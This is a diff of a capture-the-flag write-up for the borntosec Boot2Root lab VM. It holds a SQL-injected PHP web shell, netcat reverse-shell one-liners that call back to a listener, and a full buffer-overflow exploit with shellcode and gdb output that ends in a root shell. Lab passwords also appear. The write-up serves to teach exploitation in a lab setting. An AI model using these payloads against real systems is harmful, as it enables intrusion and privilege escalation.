@@ -133,7 +133,7 @@ Finished
 > ![Warning]
 > to connect at forum don't use http:// is forbidden use https://
 
-![alt](/img/forum.png)
+![alt](img/forum.png)
 
 When we check the topics, our eyes are attract by "Problem login ?" 
 
@@ -174,11 +174,11 @@ Now we can connect in the forum with **admin** and the same password than **lmez
 
 Now we can access at the __Admin page__
 
-![alt](/img/Admin_forum.png)
+![alt](img/Admin_forum.png)
 
-![alt](/img/update_forum.png)
+![alt](img/update_forum.png)
 
-![alt](/img/template_c.png)
+![alt](img/template_c.png)
 
 in this page there is some php files. We will note this **url**
 
@@ -219,7 +219,7 @@ SELECT '<HTML><BODY><FORM METHOD="GET" NAME="myform" ACTION=""><INPUT TYPE="text
 https://192.168.1.146/forum/templates_c/cmd.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20192.168.1.146%2012345%20%3E%2Ftmp%2Ff
 
 Now, we can connect at https://192.168.1.146/forum/templates_c/cmd.php?cmd=id :
-![alt](/img/etc_passwd.png)
+![alt](img/etc_passwd.png)
 
 -----------
 
@@ -234,7 +234,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
 ```
 
 on our terminal 
-![alt](/img/nc_reverseshell.png)
+![alt](img/nc_reverseshell.png)
 ```sh
 cat /home/LOOKATME/password
 >> lmezard:G!@M6f4Eatau{sF"
@@ -321,34 +321,229 @@ we did that for every getme until getme8(), that gave us :
 SHA-256
 	`330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
 `
+
+------------------------------
+
+## Privilege Escalation via Buffer Overflow (zaz)
+
+#### Tuto Overflow With Shellcode : <a/>'https://www.samsclass.info/127/proj/p3-lbuf1.htm'
+
+### Finding the Offset
+
+We craft a payload to identify where the overflow reaches the instruction pointer (EIP).
+
+```bash
+vim p.py
+
+#!/usr/bin/python 
+
+nopsled = '\x90' * 64 
+shellcode = (
+'\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2' +
+'\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89' +
+'\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80'
+)
+padding = 'A' * (140 - 64 - 32) ---> 140 buffer size
+eip = '1234'
+print nopsled + shellcode + padding + eip
+
+pyton2 p.py > test
+chmod 777 test
+```
+
+-------------------------------
+
+### Analysis
+
+We analyze the binary using `gdb` to understand how user input is handled.
+
+```bash
+gdb ./exploit_me
+```
+
+Disassemble the `main` function:
+
+```bash
+(gdb) disas main
+```
+
+Relevant part:
+
+```bash
+Dump of assembler code for function main:
+   0x080483f4 <+0>:	push   %ebp
+   0x080483f5 <+1>:	mov    %esp,%ebp
+   0x080483f7 <+3>:	and    $0xfffffff0,%esp
+   0x080483fa <+6>:	sub    $0x90,%esp
+   0x08048400 <+12>:	cmpl   $0x1,0x8(%ebp)
+   0x08048404 <+16>:	jg     0x804840d <main+25>
+   0x08048406 <+18>:	mov    $0x1,%eax
+   0x0804840b <+23>:	jmp    0x8048436 <main+66>
+   0x0804840d <+25>:	mov    0xc(%ebp),%eax
+   0x08048410 <+28>:	add    $0x4,%eax
+   0x08048413 <+31>:	mov    (%eax),%eax
+   0x08048415 <+33>:	mov    %eax,0x4(%esp)
+   0x08048419 <+37>:	lea    0x10(%esp),%eax
+   0x0804841d <+41>:	mov    %eax,(%esp)
+   0x08048420 <+44>:	call   0x8048300 <strcpy@plt>
+   0x08048425 <+49>:	lea    0x10(%esp),%eax					<--------- Address of the return of strcpy (the function which overflows)
+   0x08048429 <+53>:	mov    %eax,(%esp)
+   0x0804842c <+56>:	call   0x8048310 <puts@plt>
+   0x08048431 <+61>:	mov    $0x0,%eax
+   0x08048436 <+66>:	leave  
+   0x08048437 <+67>:	ret   
+```
+
+Breakpoint before running: 
+
+```bash
+(gdb) b *0x08048425
+Breakpoint 1 at 0x8048425
+```
+
+Run with gdb:
+```bash
+(gdb) run $(cat test)
+Starting program: /home/zaz/exploit_me $(cat a)
+/bin/bash: warning: setlocale: LC_ALL: cannot change locale (fr_FR.UTF-8)
+
+Breakpoint 1, 0x08048425 in main ()
+```
+
+Inspect the stack:
+```bash
+(gdb) x/40x $esp
+0xbffff520:	0xbffff530	0xbffff7b3	0x00000001	0xb7ec3c2d
+0xbffff530:	0x90909090	0x90909090	0x90909090	0x90909090		<------------- Uninterpreted characters ('\90' * 64)
+0xbffff540:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff550:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff560:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff570:	0xc389c031	0x80cd17b0	0x6852d231	0x68732f6e		<------------- Our shellcode
+0xbffff580:	0x622f2f68	0x52e38969	0x8de18953	0x80cd0b42
+0xbffff590:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff5a0:	0x41414141	0x41414141	0x41414141	0x41414141		<------------- The 'A' or '41'
+0xbffff5b0:	0x41414141	0x41414141	0x41414141	0x34333231		<------------- The last 4 bytes correspond to the return pointer (EIP). '1234' or '34333231'  
+```
+------------------------------------
+
+### Exploitation
+
+We now replace EIP with an address pointing to our NOP sled.
+
+From the stack:
+
+```bash
+0xbffff530 -> start of nopsled
+```
+Convert to little-endian:
+
+```python
+eip = '\x50\xf5\xff\xbf'
+```
+Final exploit:
+```bash
+vim p.py
+
+#!/usr/bin/python 
+
+nopsled = '\x90' * 64 
+shellcode = (
+'\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2' +
+'\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89' +
+'\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80'
+)
+padding = 'A' * (140 - 64 - 32) ---> 140 buffer size
+eip = \'\x50\xf5\xff\xbf\' 										<------------- 0xbffff550 since the Intel x86 processor in "little-endian", the least significant 
+print nopsled + shellcode + padding + eip									   the address byte comes first, so we need to reverse the order of the bytes
+```
+
+Generate payload:
+```bash
+pyton2 p.py > test
+```
+Repeat the previous steps:
+```bash
+gdb ./exploit_me
+(gdb) b *0x08048425
+Breakpoint 1 at 0x8048425
+(gdb) run $(cat test)
+Starting program: /home/zaz/exploit_me $(cat test)
+/bin/bash: warning: setlocale: LC_ALL: cannot change locale (fr_FR.UTF-8)
+
+Breakpoint 1, 0x08048425 in main ()
+(gdb) x/x40 $esp
+A syntax error in expression, near $esp.
+(gdb) x/40x $esp
+0xbffff520:	0xbffff530	0xbffff7b3	0x00000001	0xb7ec3c2d
+0xbffff530:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff540:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff550:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff560:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff570:	0xc389c031	0x80cd17b0	0x6852d231	0x68732f6e
+0xbffff580:	0x622f2f68	0x52e38969	0x8de18953	0x80cd0b42
+0xbffff590:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff5a0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff5b0:	0x41414141	0x41414141	0x41414141	0xbffff550		<------------- Our previously modified EIP
+(gdb) c
+Continuing.
+����������������������������������������������������������������1��ð̀1�Rhn/shh//bi��RS��B
+                                                                                        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP���
+process 2233 is executing new program: /bin/dash
+//bin/sh: relocation error: //bin/sh: symbol &�����-��u�@
+                                                         , version GLIBC_2.0 not defined in file libc.so.6 with link time reference
+[Inferior 1 (process 2233) exited with code 0177]
+```
+
+---
+
+### Getting a Root Shell
+
+Execute the binary with gdb:
+
+```bash
+./exploit_me $(cat test)
+```
+
+If successful:
+
+```bash
+# whoami
+root
+```
+We now have a root shell.
+
+---
+
+### Verification
+
+```bash
+cd /root
+cat README
+```
+
+Output:
+
+```
+CONGRATULATIONS !!!!
+To be continued...
+```
+
+----
+
 ## Users informations
 
-|   Username |	Type | UID |	Homepage	| E-mail | pwd |
-|----| ---- | --- | --- |----- | ---- | 
+|   Username |	Type | UID |	Homepage	| E-mail | passwd | ssh passwd | 
+|----| ---- | --- | --- |----- | ---- | ---- |
 |   root |	root |	 0  | |	root@mail.borntosec.net|`Fg-'kKXBj87E:aJ$`|
 |   admin |	Admin |	 1000  | |	admin@borntosec.net | | |
-|   lmezard |	User | 1040| 	 |		laurie@borntosec.net  | `!q\]Ej?*5K5cy*AJ` </br> `G!@M6f4Eatau{sF"`|
+|   lmezard |	User | 1040| 	 |		laurie@borntosec.net  | `!q\]Ej?*5K5cy*AJ` </br> `G!@M6f4Eatau{sF"`| 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
 |   qudevide |	User | | 	 |	qudevide@borntosec.net  | |
 |   thor |	User |	 | | 	thor@borntosec.net  | |
 |   wandre |	User | | 	 | wandre@borntosec.net | |
 |   zaz |	User |	 | | zaz@borntosec.net | |
 
 
-
-
 ----------------
-
-# A supprimer Brouillon 
-https://192.168.1.146/forum/index.php
-
-"In order to log in, cookies have to be activated!"
-
- Modifier	Modifier Éditer en place	Copier Copier	Effacer Effacer	1	2	admin		0	0000-00-00	ed0fd64f25f3bd3a54f8d272ba93b6e76ce7f3d0516d551c28	admin@borntosec.net	1					8	2015-10-08 23:08:16	2015-10-08 23:08:16	192.168.1.47	2015-10-08 01:47:03	NULL	0	0	1	0	0	0	0	0						0		2,5,3,1,6,4
-	Modifier Modifier	Modifier Éditer en place	Copier Copier	Effacer Effacer	2	0	qudevide		0	0000-00-00	a12e059d6f4c21c6c5586283c8ecb2b65618ed0a0dc1b302a2	qudevide@borntosec.net	0					1	2015-10-08 02:01:43	2015-10-08 02:02:05	192.168.1.47	2015-10-08 01:52:42	NULL	0	0	1	0	0	0	0	0						0		1,2,3,4
-	Modifier Modifier	Modifier Éditer en place	Copier Copier	Effacer Effacer	3	0	thor		0	0000-00-00	d30668b779542d60c4cde29e7170148198b1623f4453866797	thor@borntosec.net	0					1	2015-10-08 01:58:15	2015-10-08 01:58:41	192.168.1.47	2015-10-08 01:53:16	NULL	0	0	1	0	0	0	0	0						0		1,2,3
-	Modifier Modifier	Modifier Éditer en place	Copier Copier	Effacer Effacer	4	0	wandre		0	0000-00-00	f8562b53084d60efa4208fa50d1ef753ef18e089d2dd56c4ed	wandre@borntosec.net	0					1	2015-10-08 01:57:38	2015-10-08 01:58:03	192.168.1.47	2015-10-08 01:53:48	NULL	0	0	1	0	0	0	0	0						0		1,2
-	Modifier Modifier	Modifier Éditer en place	Copier Copier	Effacer Effacer	5	0	lmezard		0	0000-00-00	0171e7dbcbf4bd21a732fa859ea98a2950b4f8aa1e5365dc90	laurie@borntosec.net	0					5	2026-06-18 15:34:09	2026-06-18 15:34:09	192.168.1.144	2015-10-08 01:54:38	NULL	0	0	1	0	0	0	0	0						0		8,7,5,4,3,2,6,1
-	Modifier Modifier	Modifier Éditer en place	Copier Copier	Effacer Effacer	6	0	zaz		0	0000-00-00	f10b3271bf523f12ebd58ef8581c851991bf0d4b4c4bf49d7c	zaz@borntosec.net	0	
 
 ## REF
 
